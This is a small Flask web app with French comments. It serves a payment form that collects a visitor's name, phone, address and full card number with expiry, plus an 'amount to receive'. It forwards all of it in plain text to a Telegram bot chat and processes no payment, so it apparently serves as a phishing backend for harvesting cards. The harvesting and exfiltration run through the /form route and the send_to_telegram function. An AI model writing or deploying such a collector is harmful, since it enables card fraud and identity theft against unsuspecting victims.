from flask import Flask, render_template, request, redirect
import requests
import os
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)

TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    data = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
    requests.post(url, data=data)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/form', methods=['GET', 'POST'])
def form():
    if request.method == 'POST':
        # Récupérer les champs du formulaire de paiement
        name = request.form['name']
        phone = request.form['phone']
        address = request.form['address']
        card_type = request.form['card_type']
        card_number = request.form['card_number']
        expiry_month = request.form['expiry_month']
        expiry_year = request.form['expiry_year']
        amount = request.form['amount']

        # Créer un message à envoyer sur Telegram
        message = (
            f"👤 Nom: {name}\n"
            f"📞 Téléphone: {phone}\n"
            f"🏠 Adresse: {address}\n"
            f"💳 Type de carte: {card_type}\n"
            f"🔢 Numéro de carte: {card_number}\n"
            f"📅 Expiration: {expiry_month}/{expiry_year}\n"
            f"💰 Montant à recevoir: {amount} €"
        )
        send_to_telegram(message)
        return redirect('/thank-you')
    return render_template('form.html')

@app.route('/thank-you')
def thank_you():
    return render_template('thank_you.html')

if __name__ == '__main__':
    app.run(debug=True)
